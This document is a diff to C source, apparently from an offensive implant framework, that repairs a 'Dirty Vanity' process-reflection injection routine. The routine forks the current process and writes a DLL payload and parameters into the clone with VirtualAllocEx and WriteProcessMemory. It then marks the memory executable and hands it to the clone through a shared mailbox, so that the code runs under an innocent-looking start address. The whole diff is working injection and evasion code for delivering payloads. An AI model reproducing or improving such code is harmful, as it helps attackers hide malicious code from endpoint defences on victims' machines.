@@ -237,8 +237,14 @@ BOOL procinj_execute_has(BYTE opcode) {
  * first thread runs it. Identical image to us, kernel-recorded start
  * address inside that image: the whole point of the technique. */
 typedef struct _T2_RTL_PROCESS_REFLECTION_INFORMATION {
-	void * ReflectionThreadHandle; /* phnt layout: thread handle first */
-	void * UniqueProcess;          /* CLIENT_ID */
+	void * ReflectionProcessHandle; /* live-probed layout: process handle,
+	                                  * thread handle, then CLIENT_ID. The
+	                                  * phnt thread-handle-first order parses
+	                                  * the thread handle as the pid and the
+	                                  * spawn-side OpenProcess fails with
+	                                  * ERROR_INVALID_PARAMETER (gle 87). */
+	void * ReflectionThreadHandle;
+	void * UniqueProcess;
 	void * UniqueThread;
 } T2_REFLECTION_INFORMATION;
 
@@ -260,7 +266,8 @@ typedef struct {
 } DV_MAILBOX;
 
 static DV_MAILBOX dv_mailbox = { 0, NULL, NULL };
-static DWORD dv_clone_pid = 0;
+static HANDLE dv_clone_handle = NULL;
+static DWORD  dv_clone_pid = 0;
 
 void dv_nursery_trampoline(void * unused) {
 	(void)unused;
@@ -297,9 +304,11 @@ void dv_nursery_init(void) {
 		return;
 	}
 
+	dv_clone_handle = info.ReflectionProcessHandle;
 	pid = (DWORD)(DWORD_PTR)info.UniqueProcess;
-	if (pid == 0 || pid == GetCurrentProcessId()) {
-		spawn_log("dv: nursery layout mismatch?", (long)pid);
+	if (dv_clone_handle == NULL || pid == 0 || pid == GetCurrentProcessId()) {
+		spawn_log("dv: nursery layout mismatch? pid=", (long)pid);
+		dv_clone_handle = NULL;
 		return;
 	}
 	dv_clone_pid = pid;
@@ -322,19 +331,16 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 	HANDLE hc;
 	DV_MAILBOX mb;
 
-	if (dv_clone_pid == 0)
+	if (dv_clone_pid == 0 || dv_clone_handle == NULL)
 		return FALSE;
 
-	hc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, dv_clone_pid);
-	if (hc == NULL) {
-		spawn_log("dv: OpenProcess clone failed gle=", (long)GetLastError());
-		return FALSE;
-	}
+	/* the reflection information carries a process handle already valid
+	 * in our context - no OpenProcess round trip needed */
+	hc = dv_clone_handle;
 
 	remote = VirtualAllocEx(hc, NULL, (SIZE_T)dllen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (remote == NULL || !WriteProcessMemory(hc, remote, dll, (SIZE_T)dllen, &got) || got != (SIZE_T)dllen) {
 		spawn_log("dv: payload write failed gle=", (long)GetLastError());
-		CloseHandle(hc);
 		return FALSE;
 	}
 	VirtualProtectEx(hc, remote, (SIZE_T)dllen, PAGE_EXECUTE_READ, &oldp);
@@ -343,7 +349,6 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 		rparam = VirtualAllocEx(hc, NULL, (SIZE_T)plen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		if (rparam == NULL || !WriteProcessMemory(hc, rparam, parameter, (SIZE_T)plen, &got) || got != (SIZE_T)plen) {
 			spawn_log("dv: param write failed gle=", (long)GetLastError());
-			CloseHandle(hc);
 			return FALSE;
 		}
 	}
@@ -355,13 +360,11 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 	 * the identical VA (fork preserves the address space) */
 	if (!WriteProcessMemory(hc, &dv_mailbox, &mb, sizeof(mb), &got) || got != sizeof(mb)) {
 		spawn_log("dv: mailbox write failed gle=", (long)GetLastError());
-		CloseHandle(hc);
 		return FALSE;
 	}
 
-	CloseHandle(hc);
 	spawn_log("dv: payload delivered to clone pid=", (long)dv_clone_pid);
-	dv_clone_pid = 0; /* one-shot */
+	dv_clone_pid = 0; /* one-shot: the handle stays for nothing further */
 	return TRUE;
 #endif
 }
